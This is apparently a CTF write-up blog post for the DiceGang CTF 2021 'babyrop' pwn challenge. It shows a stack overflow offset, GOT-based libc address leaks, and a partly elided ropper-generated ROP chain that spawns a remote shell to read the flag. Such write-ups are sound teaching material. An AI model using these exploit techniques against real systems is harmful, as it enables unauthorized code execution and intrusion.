---
layout: post
title: DiceGang CTF 2021 - babyrop [pwn]
author: hugsy
tags: [pwn,dicegang,rop,]
date: 2021-02-07 18:37
---

 * Competition: [DiceGang CTF 2021]()
 * Challenge Name: BabyRop
 * Type: Pwn
 * Points: 116 pts
 * Description:
 > "FizzBuzz101: Who wants to write a ret2libc"
 >
 > nc dicec.tf 31924


This was a beginner level challenge which as the name suggests is all about ROP. Some basic fingerprinting on the `babyrop` binary gives us useful information, such as no canary and partial RelRO.

<!--more-->
```bash
$ file babyrop
babyrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a721f8e2550d74dddcaae7e8754bff9095e3488d, for GNU/Linux 3.2.0, not stripped
$ checksec babyrop
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Opening the binary in a disassembler and the vulnerability becomes obvious: it's a basic stack overflow.

![img](https://i.imgur.com/2sB9fCv.png)

And we can quickly determine the distance to control `$rip` (since there's no canary)

```
0:000 ➤  pattern search $rsp
[+] Searching '$rsp'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 65 (big-endian search)
```

However, the libc version is unknown and we don't have enough gadgets in the binary itself to trigger a call to `system()` or make a `syscall`. After a bit of search, we spotted 2 interesting gadgets:

- `0x4011b0` would call an arbitrary location if we control r15 and rbx (and the parameter arguments)
![img](https://i.imgur.com/8T0TTPH.png)
- `0x4011ca` would pop all the required registers
![img](https://i.imgur.com/NotESgM.png)

The binary uses `gets` and `write` therefore we have enough to build an arbitrary `read` primitive.

```python
def read(addr, length):
    pop_rbx_rbp_r12_r13_r14_r15 = 0x4011ca
    call_r15_rbx = 0x4011b0

    return flat(
        p64(pop_rbx_rbp_r12_r13_r14_r15),
        p64(0),
        p64(1),
        p64(1),
        p64(addr),
        p64(length),
        p64(0x0404018),
        p64(call_r15_rbx),
        b"JUNKJUNK"*7,
    )
```

If we apply it to the GOT of `write` (GOT 0x404018) and `gets` (GOT 0x404020), we have all we need to leak 2 libc addresses:

```
[*] leaking libc addresses...
[+] write: 0x7ffff7eda1d0
[+] gets: 0x7ffff7e4faf0
```

From just those 2 addresses, we can determine the libc using https://libc.blukat.me, which [pointed to `libc6_2.31-0ubuntu9.1_amd64`](https://libc.blukat.me/?q=write%3A0x7f859309e1d0%2Cgets%3A0x7f8593013af0).


In this case, the size of the ropchain is not a problem, so I downloaded the libc and used [`ropper`](https://github.com/sashs/Ropper) with its `--chain` argument to get easily a working chain to do `execve("/bin/sh")`

```python
    # shellcode from ropper --chain="execve cmd=/bin/sh""
    rebase_0 = lambda x : p64(x  + libc_base)
    rop = b''
    rop += rebase_0(0x000000000002911d) # 0x000000000002911d: pop r13; ret;
    rop += b'//bin/sh'
    rop += rebase_0(0x00000000000331ff) # 0x00000000000331ff: pop rbx; ret;
    rop += rebase_0(0x00000000001eb1a0)
    [...]
    rop += rebase_0(0x000000000004a550) # 0x000000000004a550: pop rax; ret;
    rop += p64(0x000000000000003b)
    rop += rebase_0(0x0000000000066229) # 0x0000000000066229: syscall; ret;
```

That's it, put it all together and we have a [working exploit](https://gist.github.com/hugsy/d8d2a775d8ca4604596aa90ecaccd48e) we can execute remotely, and cat the flag:

```bash
$ ./xp.py
[...]
[+] write: 0x7ffff7eda1d0
[+] gets: 0x7ffff7e4faf0
[+] libc:0x7ffff7dc9000
[+] system:0x7ffff7e1e419
[*] Switching to interactive mode
$ cat flag.txt
dice{so_let's_just_pretend_rop_between_you_and_me_was_never_meant_b1b585695bdd0bcf2d144b4b}
```
